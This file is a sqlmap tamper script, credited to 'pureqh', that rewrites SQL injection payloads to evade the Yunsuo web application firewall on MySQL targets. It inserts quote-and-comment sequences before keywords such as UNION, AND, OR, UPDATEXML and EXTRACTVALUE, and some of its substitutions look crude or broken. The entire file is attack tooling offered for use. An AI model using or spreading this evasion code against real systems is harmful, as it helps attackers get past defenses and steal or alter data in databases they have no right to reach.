#!/usr/bin/env python
# -*- coding: utf-8 -*-



"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
Author:pureqh.top
"""

import re
import os

from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass yunsuo by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):

        payload=payload.replace("and","'/*' and")
        payload=re.sub(r'(ORDER BY \d+)', "x", payload)
        payload=payload.replace("UNION","'/*' union")
        payload=payload.replace("WHERE (","'/*' WHERE")
        payload=payload.replace("||","||'/*'")
        payload=payload.replace("OR ROW","'/*' OR ROW")
        payload=payload.replace("PROCEDURE","'/*' PROCEDURE")
        payload=payload.replace("OR 1","'/*' OR 1")
        payload=payload.replace("OR UPDATEXML","'/*' OR UPDATEXML")
        payload=payload.replace("OR EXTRACTVALUE","'/*' OR EXTRACTVALUE",1)
        payload=payload.replace("OR (","'/*' OR (")
        payload=payload.replace("RLIKE","'/*' RLIKE")
        payload=payload.replace("&","'/*' '&'")
        payload=payload.replace("+","'/*' +")
        payload=payload.replace("`","'/*' `")
        payload=payload.replace("AND","'/*' AND",1)
        payload=payload.replace("OPERATION","'/*' 1")
        payload=payload.replace("OR JSON","'/*' OR JSON")
        payload=payload.replace("OR EXP","'/*' OR EXP")
        payload=payload.replace("OR GTID","'/*' OR GTID")
        payload=payload.replace(";","'/*' ;")
        return payload
